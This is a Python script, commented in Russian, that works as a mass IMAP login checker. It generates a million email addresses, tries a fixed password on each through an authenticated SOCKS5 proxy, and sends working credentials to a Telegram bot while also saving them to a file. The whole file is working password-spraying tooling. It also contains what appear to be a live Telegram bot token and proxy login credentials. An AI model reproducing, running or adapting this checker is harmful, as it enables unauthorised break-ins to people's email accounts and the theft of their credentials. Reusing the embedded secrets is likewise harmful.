import random
import imaplib
import socks
import socket
import ssl
import requests
from concurrent.futures import ThreadPoolExecutor

# Настройки для Telegram Bot API
TELEGRAM_BOT_TOKEN = '7859317490:AAHi6lghknwbKU0fPHULZKyl42aGcG1lNyM'
CHAT_ID = '7412395676'

# Настройки прокси (логин, пароль, хост, порт)
PROXY_HOST = '178.171.69.74'
PROXY_PORT = 8000  # например, 1080 для SOCKS5
PROXY_USERNAME = '4a3P3R'
PROXY_PASSWORD = 'X2S9nB'

# Глобальные счетчики
checked_count = 0
not_found_count = 0

# Функция для отправки сообщения в Telegram
def send_telegram_message(message):
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    payload = {'chat_id': CHAT_ID, 'text': message}
    try:
        requests.post(url, data=payload)
    except Exception as e:
        print(f"Ошибка отправки сообщения в Telegram: {e}")

# Функция для записи аккаунтов в файл
def save_to_file(filename, content):
    try:
        with open(filename, 'a') as file:
            file.write(content + '\n')
    except Exception as e:
        print(f"Ошибка записи в файл {filename}: {e}")

# Функция для чтения IMAP серверов из файла
def read_imap_config(filename):
    imap_servers = []
    try:
        with open(filename, 'r') as file:
            for line in file:
                parts = line.strip().split()
                if len(parts) == 3:
                    imap_servers.append({
                        'server': parts[0],
                        'port': int(parts[1]),
                        'prefix': parts[2]
                    })
    except Exception as e:
        print(f"Ошибка чтения файла конфигурации {filename}: {e}")
    return imap_servers

# Установка прокси для imaplib через socks
def set_proxy():
    socks.setdefaultproxy(socks.SOCKS5, PROXY_HOST, PROXY_PORT, True, PROXY_USERNAME, PROXY_PASSWORD)
    socket.socket = socks.socksocket

# Функция для генерации email'ов
def generate_emails(prefix, count=1000000):
    emails = []
    numbers = list(range(count))
    random.shuffle(numbers)  # Перемешиваем список
    for number in numbers:
        formatted_number = f"{number:06}"  # Форматирование с ведущими нулями (000000-999999)
        email = f"{prefix}{formatted_number}@{prefix}.com"
        password = "chacha123"  # Пример пароля, можете заменить на динамически генерируемый
        emails.append((email, password))
    return emails

# Проверка логина по IMAP с прокси
def check_imap_login(email, password, imap_server, imap_port=993):
    global checked_count, not_found_count
    try:
        context = ssl.create_default_context()
        mail = imaplib.IMAP4_SSL(imap_server, imap_port, ssl_context=context)
        mail.login(email, password)
        mail.logout()
        # Если логин успешный
        valid_message = f"[VALID] {email}:{password}"
        send_telegram_message(valid_message)
        print(valid_message)
        # Сохраняем валидный аккаунт в файл valid_accounts.txt
        save_to_file('valid_accounts.txt', f"{email}:{password}")
        # Обнуляем счётчик не найденных аккаунтов
        not_found_count = 0
        return True
    except imaplib.IMAP4.error:
        # Сохраняем проверенный аккаунт в файл checked_accounts.txt
        save_to_file('checked_accounts.txt', f"{email}:{password}")
        # Увеличиваем счётчики
        checked_count += 1
        not_found_count += 1
        # Каждые 50 проверок отправляем сообщение, если не нашлось валидных аккаунтов
        if checked_count % 50 == 0 and not_found_count >= 50:
            send_telegram_message(f"Проверено {checked_count} аккаунтов, валидных не найдено.")
            not_found_count = 0
        return False
    except Exception as e:
        print(f"Ошибка: {e}")
        return False

# Многопоточная проверка email через IMAP
def check_emails(imap_server, emails, threads=10, imap_port=993):
    send_telegram_message("Начинается проверка аккаунтов.")  # Уведомление о начале проверки
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(check_imap_login, email, password, imap_server, imap_port): (email, password) for email, password in emails}
        for future in futures:
            try:
                future.result()  # Блокирует выполнение до завершения
            except Exception as e:
                print(f"Ошибка при проверке {futures[future]}: {e}")

# Запуск бота
send_telegram_message("Бот запущен.")  # Уведомление о запуске бота

# Устанавливаем прокси
set_proxy()

# Чтение IMAP конфигурации из файла
imap_servers = read_imap_config('imap_config.txt')

# Проходим по каждому серверу из конфигурации
for imap_config in imap_servers:
    send_telegram_message(f"Генерация почт для {imap_config['server']}...")
    emails = generate_emails(imap_config['prefix'], count=1000000)  # Генерация email'ов
    send_telegram_message(f"Проверка почт для {imap_config['server']} начата.")
    check_emails(imap_config['server'], emails, threads=10, imap_port=imap_config['port'])
